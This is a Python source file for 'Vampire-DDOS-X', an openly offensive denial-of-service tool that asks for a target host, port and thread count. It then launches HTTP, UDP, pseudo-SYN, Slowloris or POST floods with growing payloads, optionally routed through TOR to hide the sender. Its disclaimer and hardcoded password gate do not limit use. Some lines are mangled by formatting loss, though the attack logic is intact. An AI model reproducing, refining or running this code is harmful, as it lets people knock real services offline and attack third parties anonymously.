#!/usr/bin/env python3

-- coding: utf-8 --

""" Vampire-DDOS-X v2.1 Fully refactored by Muhammad Shourov (Vampire Squad) GitHub: https://github.com/vampiresquad/Vampire-DDOS-X License: MIT """

import os import sys import time import socket import threading import random import subprocess import getpass import logging from logging.handlers import RotatingFileHandler from concurrent.futures import ThreadPoolExecutor, as_completed from colorama import Fore, Style, init import socks

─── Configuration ──────────────────────────────────────────────────────────────

ADMIN_PASSWORD = os.getenv('VDDOS_ADMIN_PW', ':404X') TOR_PASSWORD   = os.getenv('VDDOS_TOR_PW', ':404X') LOG_FILE       = 'vddosx.log' AUDIT_LOG_FILE = 'vddosx_audit.log' MAX_LOG_BYTES  = 5 * 1024 * 1024 BACKUP_COUNT   = 3 ATTACK_TIMEOUT = 5           # seconds per socket INITIAL_PAYLOAD = 1024       # bytes MAX_PAYLOAD     = 65536      # bytes RAMP_INTERVAL   = 30         # seconds RAMP_FACTOR     = 2

Shared state

attack_active = threading.Event() attack_active.set() requests_sent = 0 requests_lock = threading.Lock() payload_size = INITIAL_PAYLOAD

─── Logger Setup ───────────────────────────────────────────────────────────────

logger = logging.getLogger('VDDOSX') logger.setLevel(logging.DEBUG) fmt = logging.Formatter( '%(asctime)s [%(threadName)s] %(levelname)s: %(message)s' )

Console handler

ch = logging.StreamHandler() ch.setLevel(logging.INFO) ch.setFormatter(fmt)

Rotating file handler

fh = RotatingFileHandler(LOG_FILE, maxBytes=MAX_LOG_BYTES, backupCount=BACKUP_COUNT) fh.setLevel(logging.DEBUG) fh.setFormatter(fmt) logger.addHandler(ch) logger.addHandler(fh)

Audit logger

audit = logging.getLogger('VDDOSX_AUDIT') audit_handler = RotatingFileHandler(AUDIT_LOG_FILE, maxBytes=MAX_LOG_BYTES, backupCount=BACKUP_COUNT) audit_handler.setFormatter(logging.Formatter('%(asctime)s: %(message)s')) audit.addHandler(audit_handler) audit.setLevel(logging.INFO)

────────────────────────────────────────────────────────────────────────────────

─── Auto-fix Routine ──────────────────────────────────────────────────────────

def auto_fix(error): logger.warning(f"Auto-fixing error: {error}") msg = str(error) # Handle missing modules if 'No module named' in msg: mod = msg.split("'")[1] install(mod) # Handle pip/apt failures elif isinstance(error, subprocess.CalledProcessError): logger.info("Retrying failed subprocess command...") # Could implement retry logic here # Handle socket issues elif isinstance(error, socket.error): logger.info("Reinitializing socket library...") # Generic fallback time.sleep(1)

─── Module Auto-Install ────────────────────────────────────────────────────────

def install(module, pip_name=None): pip_name = pip_name or module try: import(module) except ImportError as e: logger.info(f"Installing missing module: {pip_name}") try: subprocess.check_call([sys.executable, '-m', 'pip', 'install', pip_name]) except subprocess.CalledProcessError as cp_err: auto_fix(cp_err)

────────────────────────────────────────────────────────────────────────────────

─── Advanced Disclaimer ─────────────────────────────────────────────────────────

def show_disclaimer(): disclaimer = f""" {Fore.RED}{Style.BRIGHT}THIS TOOL IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND. USE ONLY WITH EXPLICIT AUTHORIZATION. VIOLATORS ASSUME ALL LIABILITY. See LICENSE (MIT) in repository for details.{Style.RESET_ALL} """ logger.warning(disclaimer) input("Press ENTER to confirm authorization...") pw = getpass.getpass("Enter authorization password: ") audit.info(f'User entered auth password: {len(pw)} chars') if pw != ADMIN_PASSWORD: logger.error("Invalid authorization password—exiting.") sys.exit(1)

────────────────────────────────────────────────────────────────────────────────

─── TOR Setup ─────────────────────────────────────────────────────────────────

def install_tor(): try: subprocess.check_call(['pkg', 'install', '-y', 'tor']) except subprocess.CalledProcessError as e: auto_fix(e) raise

def enable_tor(): ans = input("Enable TOR routing? (y/n): ").strip().lower() if ans == 'y': pw = getpass.getpass("Enter TOR password: ") if pw == TOR_PASSWORD: logger.info("Enabling TOR...") install_tor() subprocess.Popen(['tor'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) time.sleep(5) socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050) socket.socket = socks.socksocket logger.info("TOR routing enabled.") else: logger.warning("Incorrect TOR password; skipping TOR.")

────────────────────────────────────────────────────────────────────────────────

─── Attack Logic ───────────────────────────────────────────────────────────────

def attack(target, port, attack_type): global requests_sent, payload_size sock = None try: while attack_active.is_set(): try: # Choose payload size based on current ramp size = payload_size if attack_type == "2":  # UDP Flood sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) sock.settimeout(ATTACK_TIMEOUT) sock.sendto(random._urandom(size), (target, port)) else:  # TCP-based sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(ATTACK_TIMEOUT) sock.connect((target, port)) if attack_type == "1":  # HTTP sock.sendall(f"GET / HTTP/1.1\r\nHost: {target}\r\n\r\n".encode()) elif attack_type == "3":  # SYN sock.sendall(b"\x00" * size) elif attack_type == "4":  # Slowloris for _ in range(50): sock.sendall(f"X-a: {random.randint(1,5000)}\r\n".encode()) time.sleep(0.5) elif attack_type == "5":  # POST payload = "username=admin&password=admin" headers = ( f"POST / HTTP/1.1\r\nHost: {target}\r\n" f"Content-Length: {len(payload)}\r\n" f"Content-Type: application/x-www-form-urlencoded\r\n\r\n{payload}" ) sock.sendall(headers.encode()) with requests_lock: requests_sent += 1 logger.debug(f"Sent packet #{requests_sent} of size {size}") except Exception as e: logger.debug(f"Error during attack send: {e}") auto_fix(e) continue finally: if sock: sock.close()

────────────────────────────────────────────────────────────────────────────────

def show_stats(): while attack_active.is_set(): logger.info(f"Requests Sent: {requests_sent} | Current Payload: {payload_size} bytes") time.sleep(1)

─── Strength Ramping ───────────────────────────────────────────────────────────

def ramp_strength(): global payload_size while attack_active.is_set() and payload_size < MAX_PAYLOAD: time.sleep(RAMP_INTERVAL) new_size = min(payload_size * RAMP_FACTOR, MAX_PAYLOAD) if new_size != payload_size: payload_size = new_size logger.info(f"Attack strength increased: payload_size={payload_size}")

────────────────────────────────────────────────────────────────────────────────

def main(): init(autoreset=True) logger.info("Vampire-DDOS-X v2.1 starting...") show_disclaimer()

mode = input("Enter mode (admin/user): ").strip().lower()
if mode == 'admin':
    pw = getpass.getpass("Admin password: ")
    if pw != ADMIN_PASSWORD:
        logger.error("Wrong admin password.")
        return

enable_tor()

try:
    target  = input("Target IP/Host: ").strip()
    port    = int(input("Target Port: "))
    threads = int(input("Threads Count: "))
    if not (1 <= port <= 65535 and threads > 0):
        raise ValueError("Invalid numerical inputs")
except Exception as e:
    logger.error(f"Input error: {e}")
    auto_fix(e)
    return

print("""\nAttack Types:
1. HTTP Flood
2. UDP Flood
3. SYN Flood
4. Slowloris
5. POST Flood

""") attack_type = input("Choice: ").strip() if attack_type not in {"1","2","3","4","5"}: logger.error("Invalid attack type.") return

logger.info(f"Starting attack on {target}:{port} with {threads} threads (type {attack_type})")
audit.info(f'Attack launched: {target}:{port}, threads={threads}, type={attack_type}')

# Start stats and ramp threads
threading.Thread(target=show_stats, daemon=True).start()
threading.Thread(target=ramp_strength, daemon=True).start()

# Launch attack threads
with ThreadPoolExecutor(max_workers=threads) as executor:
    futures = [executor.submit(attack, target, port, attack_type) for _ in range(threads)]
    try:
        for _ in as_completed(futures):
            pass
    except KeyboardInterrupt:
        logger.warning("User requested stop.")
        attack_active.clear()

logger.info(f"Attack stopped. Total requests: {requests_sent}")

if name == 'main': main()

